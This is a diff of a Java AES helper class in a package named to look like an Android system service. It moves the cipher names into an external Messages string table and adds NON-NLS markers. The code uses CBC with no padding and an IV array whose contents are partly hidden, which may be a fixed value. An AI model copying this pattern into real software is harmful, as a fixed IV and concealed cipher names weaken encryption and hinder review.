@@ -16,6 +16,7 @@ import javax.crypto.NoSuchPaddingException;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
+import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 
@@ -29,7 +30,7 @@ import com.android.service.util.Check;
 public class Crypto {
 
 	/** The Constant TAG. */
-	private static final String TAG = "Crypto";
+	private static final String TAG = "Crypto"; //$NON-NLS-1$
 
 	/** The aes_key. */
 	private final byte[] aes_key;
@@ -56,7 +57,7 @@ public class Crypto {
 	public Crypto(final byte[] key) throws NoSuchAlgorithmException, NoSuchPaddingException {
 		aes_key = new byte[key.length];
 		System.arraycopy(key, 0, aes_key, 0, key.length);
-		skey_spec = new SecretKeySpec(aes_key, "AES");
+		skey_spec = new SecretKeySpec(aes_key, Messages.getString("18.0")); //$NON-NLS-1$
 
 		final byte[] iv = new byte[16];
 
@@ -66,7 +67,7 @@ public class Crypto {
 
 		ivSpec = new IvParameterSpec(iv);
 
-		cipher = Cipher.getInstance("AES/CBC/NoPadding");
+		cipher = Cipher.getInstance(Messages.getString("18.1")); //$NON-NLS-1$
 	}
 
 	/**
@@ -143,13 +144,13 @@ public class Crypto {
 		try {
 			final byte[] buffer = decrypt(cypher);
 			if (Cfg.DEBUG) {
-				Check.asserts(plain.length == buffer.length, "different size buffers");
+				Check.asserts(plain.length == buffer.length, "different size buffers"); //$NON-NLS-1$
 			}
 
 			System.arraycopy(buffer, 0, plain, 0, buffer.length);
 		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + e.toString());
+				Check.log(TAG + " Error: " + e.toString()) ;//$NON-NLS-1$
 			}
 		}
 
